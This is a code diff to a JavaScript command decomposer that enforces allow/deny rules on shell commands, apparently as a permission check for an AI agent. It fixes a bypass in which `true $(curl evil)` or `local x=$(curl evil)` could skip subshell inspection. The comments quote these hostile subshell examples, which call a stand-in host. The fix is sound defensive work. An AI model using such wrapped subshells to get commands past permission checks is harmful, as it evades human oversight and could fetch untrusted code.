@@ -46,22 +46,24 @@ const path = require('path');
 // explicitly allowlist builtins they want auto-approved.
 
 // ── Structural shell keywords — filter these out (not real commands) ──────────
-// Only includes keywords that are *nullary* or otherwise cannot wrap a subshell:
-// shell syntax markers (done/fi/esac/then/else/elif/do/break/continue/{}) and the
-// zero-arg builtins true/false used in `cmd || true` idioms.
+// Only includes shell syntax markers that cannot take arguments:
+// done/fi/esac/then/else/elif/do/break/continue/{}.
 //
-// Builtins that CAN contain subshell arguments (exit/return/local/export —
-// e.g. `local x=$(curl evil)`) are intentionally NOT filtered here. Filtering
-// them here would short-circuit the for-part loop in decomposeCommand() before
-// extractSubshells() runs, letting the inner `$(...)` bypass allow/deny checks.
-// Those builtins are instead covered by template entries Bash(local *),
-// Bash(export *), Bash(exit *), Bash(return *), which allow the outer builtin
-// while the decomposer's subshell extraction catches anything dangerous inside.
+// Builtins that CAN take arguments (including $(...) subshells) must NOT live
+// in this set, because the decomposer filters on firstWord — a firstWord match
+// would short-circuit the subshell-extraction path, letting `true $(curl evil)`
+// or `local x=$(curl evil)` silently bypass allow/deny checks.
+//
+// Bare `true` / `false` (no args) are handled separately in decomposeCommand()
+// via an exact-match short-circuit, preserving the common `cmd || true` idiom
+// while forcing `true $(...)` / `false $(...)` to fall through to
+// extractSubshells(). exit/return/local/export are covered by template entries
+// Bash(local *), Bash(export *), etc. — the outer builtin matches the allowlist
+// and the decomposer's subshell extraction inspects anything inside.
 // `eval` is never filtered or allowlisted — it executes arbitrary strings.
 const STRUCTURAL_KEYWORDS = new Set([
   'done', 'fi', 'esac', '{', '}', 'break', 'continue',
   'then', 'else', 'elif', 'do',
-  'true', 'false',
 ]);
 
 // ── Compound statement headers — filter from decomposed output ────────────────
@@ -500,6 +502,11 @@ function decomposeCommand(command) {
     if (!normalized) continue;
     if (STRUCTURAL_KEYWORDS.has(firstWord)) continue;
     if (STRUCTURAL_KEYWORDS.has(normalized)) continue;
+
+    // Bare `true`/`false` are structural (used in `cmd || true` idiom).
+    // When args are present (e.g. `true $(curl ...)`), do NOT short-circuit —
+    // fall through so extractSubshells() can inspect the subshell below.
+    if (normalized === 'true' || normalized === 'false') continue;
 
     // Filter compound statement headers (for/while/until/if/case/select)
     if (COMPOUND_HEADER_RE.test(firstWord)) continue;
